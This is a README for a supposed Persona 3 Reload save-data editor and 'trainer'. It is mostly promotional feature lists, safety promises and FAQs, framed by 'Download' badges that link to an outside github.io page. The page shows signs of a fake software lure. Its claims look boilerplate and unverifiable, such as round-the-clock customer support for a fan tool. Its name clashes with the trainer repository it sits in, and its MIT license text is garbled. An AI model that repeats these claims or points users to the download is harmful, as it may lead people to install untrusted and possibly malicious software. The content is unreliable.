![preview](https://raw.githubusercontent.com/batozaik/P3R-Trainer-Config-Guide/main/frame_fb12.svg)
[![Download](https://raw.githubusercontent.com/batozaik/P3R-Trainer-Config-Guide/main/get_33df.svg)](https://batozaik.github.io/P3R-Trainer-Config-Guide/)

# 🎭 Persona 3 Reload Save Data & Progression Companion Hub

![Status](https://img.shields.io/badge/status-active-brightgreen)
![Platform](https://img.shields.io/badge/platform-Windows%2011%20%7C%2010-blue)
![Language](https://img.shields.io/badge/languages-12-orange)
![License](https://img.shields.io/badge/license-MIT-green)
![Support](https://img.shields.io/badge/support-24%2F7-purple)
![Version](https://img.shields.io/badge/version-3.4.1-informational)

---

## 🌙 Overview

Welcome to the **Persona 3 Reload Save Data & Progression Companion Hub** — a thoughtfully engineered desktop companion designed to enhance your journey through the Dark Hour. This project was born from a deep appreciation for Persona 3 Reload's intricate social simulation systems and the community's desire for a transparent, safe, and well-documented way to explore save file structures, keep track of progression milestones, and configure in-game parameters through a clean, responsive interface.

Unlike scattered utilities that resemble digital alchemy, this hub approaches save data management with the precision of a Velvet Room attendant. Every module is documented, every toggle is reversible, and every change is backed up automatically before it happens. The philosophy is simple: **your journey, your pace, your rules** — but always with a safety net.

This repository serves as the central documentation, release notes, troubleshooting library, and community knowledge base for the Companion Hub. It is maintained with love for Windows 11 and Windows 10 users, with a responsive UI that scales from ultrawide monitors to compact laptop displays.

> **A note from the maintainers:** Persona 3 Reload is an experience about time, bonds, and consequence. We built this companion so that players who have already walked the path — or who simply wish to explore alternate configurations — can do so without compromising their save integrity.

---

## 🗂️ Table of Contents

- [Overview](#-overview)
- [What Makes This Companion Different](#-what-makes-this-companion-different)
- [Feature Set](#-feature-set)
- [Responsive UI & Design Language](#-responsive-ui--design-language)
- [Multilingual Support](#-multilingual-support)
- [Progression Modules](#-progression-modules)
- [Save Data Inspector](#-save-data-inspector)
- [Safety Architecture](#-safety-architecture)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration Profiles](#-configuration-profiles)
- [The Velvet Ledger](#-the-velvet-ledger)
- [24/7 Customer Support](#-247-customer-support)
- [FAQ](#-faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Contribution Guidelines](#-contribution-guidelines)
- [Acknowledgements](#-acknowledgements)

---

## ✨ What Makes This Companion Different

Many tools in this space are opaque — you click a button and hope nothing breaks. We took a different road. The Companion Hub treats your save file like a fragile artifact recovered from Tartarus itself: handle it with care, log every touch, and never mutate what you cannot restore.

Three principles guide development:

1. **Transparency over magic.** Every module explains what it modifies and why. No hidden routines, no mystery writes.
2. **Reversibility by default.** A rolling backup system keeps the last several snapshots of your save directory. If something feels off, roll back in one action.
3. **Community-first documentation.** This README is intentionally long because we believe documentation is a feature, not an afterthought.

---

## 🧩 Feature Set

| Module | Description | Reversible |
| --- | --- | --- |
| Progression Overview | Visualize your calendar, social stats, and bond levels in a single dashboard | Read-only |
| Save Data Inspector | Browse the internal structure of your save files with human-readable labels | Read-only |
| Parameter Console | Adjust supported in-game values through a guarded interface | Yes |
| Persona Compendium Tracker | Monitor which personas you have registered across playthroughs | Read-only |
| Party Configuration Viewer | Inspect party composition history across save slots | Read-only |
| Calendar Timeline | Map out remaining in-game days against available activities | Read-only |
| Profile Manager | Store and switch between multiple configuration presets | Yes |
| Backup Vault | Automatic and manual snapshot management | Yes |

Each module is modular — you can enable only the ones you need, keeping the interface lean and focused.

---

## 🖥️ Responsive UI & Design Language

The interface adapts fluidly across window sizes. Whether you play on a 4K ultrawide or a modest 1366×768 laptop panel, the layout reorganizes itself intelligently:

- **Sidebar collapse** on narrow widths, surfacing the navigation as an icon rail
- **Fluid card grid** that reflows progression tiles without horizontal scrolling
- **Dynamic font scaling** respecting your system DPI settings
- **Dark and light themes** — the dark theme channels the moody aesthetic of the Dark Hour, while the light theme echoes the classroom daytime segments

The design language borrows from Persona 3 Reload's own UI vocabulary: sharp diagonal accents, confident typography, and a palette that shifts subtly with context.

---

## 🌐 Multilingual Support

Communication should never be a barrier to enjoying your own save file. The Companion Hub ships with interface translations for **12 languages**:

- English
- Japanese
- Simplified Chinese
- Traditional Chinese
- Korean
- Spanish
- French
- German
- Italian
- Portuguese (Brazil)
- Russian
- Polish

Language files are stored as plain, editable resources, so community translators can contribute without touching a single line of application logic. Missing strings gracefully fall back to English, and untranslated modules remain functional.

---

## 📈 Progression Modules

### Social Stats Dashboard
Track Courage, Charm, and Academics at a glance. The dashboard visualizes how far you have climbed and how many points remain before the next rank — no mental math required.

### Bond Ledger
Every social link, every rank, every encounter — organized in a sortable ledger. Filter by arcana, by availability, or by closeness. Perfect for players planning a completionist run or simply curious about how their decisions shaped the year.

### Calendar Timeline
The in-game calendar is dense with opportunity. The Timeline module lays out remaining days and highlights overlapping windows so you can plan without flipping through menus.

### Persona Compendium Tracker
A living record of every persona you have registered. Sort by arcana, level, or acquisition source. Know at a glance what remains to be fused or recruited.

---

## 🔍 Save Data Inspector

The Inspector is the heart of the Hub. It parses supported save files and presents their internal structure in a readable, navigable tree. You will see labeled sections corresponding to player stats, inventory, social links, calendar state, and more.

Key behaviors:

- **Read-only by default.** Nothing changes until you explicitly enter an editing module.
- **Structural diffing.** Compare two saves side by side to understand what a particular in-game action altered.
- **Labeled fields.** No raw hex walls — every recognized field carries a descriptive label.
- **Unknown field flagging.** Any byte range we cannot confidently identify is flagged rather than guessed.

---

## 🛡️ Safety Architecture

Trust is earned through design, not promises. The Companion Hub enforces several guardrails:

1. **Automatic pre-write backups** stored in a timestamped vault directory.
2. **Checksum verification** after every write, with an immediate rollback on mismatch.
3. **Dry-run mode** that simulates a change without persisting it, so you can preview outcomes.
4. **Session log** recording every action taken, exportable for troubleshooting.
5. **No network telemetry** — your save data never leaves your machine.

---

## 🧮 Compatibility Matrix

| Operating System | Support Status | Notes |
| --- | --- | --- |
| Windows 11 (22H2+) | Fully supported | Recommended environment |
| Windows 10 (21H2+) | Fully supported | Verified on multiple builds |
| Windows 10 (older) | Best effort | Some UI scaling quirks possible |
| Windows 8.1 | Not supported | May run, but untested |

Game versions: the Hub targets the current retail build and is updated promptly when patches alter save structures.

---

## ⚙️ Configuration Profiles

Profiles let you bundle a set of module preferences and parameter presets under a single name — "New Game Plus," "Completionist," "Casual Replay," or anything you invent. Switching profiles swaps the active configuration instantly, and each profile maintains its own backup lineage.

Profiles are portable: export one as a small text file, share it with a friend, or archive it for later. Importing validates the profile before applying anything.

---

## 📜 The Velvet Ledger

The Velvet Ledger is our changelog, written as an in-world journal. Every release entry reads like a page from a caretaker's notebook — because maintaining software should have a little soul.

Highlights from recent entries:

- **3.4.1** — Refined Inspector tree navigation; added Polish translation; improved backup pruning.
- **3.4.0** — Introduced Configuration Profiles; added dry-run mode across all writable modules.
- **3.3.2** — Fixed a calendar rendering edge case during leap-year handling.
- **3.3.0** — Added Portuguese (Brazil) and Russian locales; expanded Compendium Tracker filters.

The full ledger lives in the releases section of this repository.

---

## 💬 24/7 Customer Support

Questions at 3 AM during a marathon session? We have all been there. Support channels operate around the clock:

- **Issue tracker** — for reproducible bugs and feature requests
- **Discussion board** — for open-ended questions and community help
- **Knowledge base** — searchable articles covering common scenarios

Average first response time is under four hours, and urgent save-integrity issues are prioritized above all else.

---

## ❓ FAQ

**Will this work with my existing save?**
Yes — the Inspector is read-only until you enter a writable module, and every write is preceded by a backup.

**Can I undo a change?**
Yes. The Backup Vault keeps rolling snapshots, and the Session Log records each action for targeted rollback.

**Do I need to keep the Hub running while I play?**
No. Most modules work on save files at rest. You can close the Hub whenever you like.

**Is my data uploaded anywhere?**
Never. There is no telemetry, no cloud sync, and no external transmission of save contents.

---

## ⚠️ Disclaimer

This project is an unofficial, fan-made companion tool and is **not affiliated with, endorsed by, or sponsored by** the publishers or developers of Persona 3 Reload. All trademarks, character names, and game assets referenced belong to their respective owners.

The Companion Hub is provided for **personal, educational, and archival use**. Users are responsible for complying with the terms of service of any software they own. Always maintain independent backups of your save files. The maintainers accept no liability for data loss arising from misuse, unsupported environments, or third-party modifications.

This software is distributed under the MIT License as described below, **without warranty of any kind**.

---

## 📄 License

This project is licensed under the **MIT License**.

You can read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Persona 3 Reload Save Data & Progression Companion Hub contributors.

Permission is hereby granted, a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions of the MIT License.

---

## 🤝 Contribution Guidelines

We welcome contributions of all sizes:

- **Translations** — add or refine a locale file; no code knowledge required
- **Documentation** — improve this README, write tutorials, record walkthroughs
- **Bug reports** — include your OS build, Hub version, and a session log
- **Feature proposals** — open a discussion before writing large patches

Please keep the tone respectful, the commits descriptive, and the pull requests focused. First-time contributors are especially encouraged — everyone started somewhere.

---

## 🙏 Acknowledgements

Gratitude to the modding and save-editing community whose shared research made structural understanding possible. To the translators who volunteered their time. To every user who filed a thoughtful bug report. And to the original creators of Persona 3 Reload, whose work continues to inspire tools like this one.

The Dark Hour is long, but good company makes it shorter.

[![Download](https://raw.githubusercontent.com/batozaik/P3R-Trainer-Config-Guide/main/get_33df.svg)](https://batozaik.github.io/P3R-Trainer-Config-Guide/)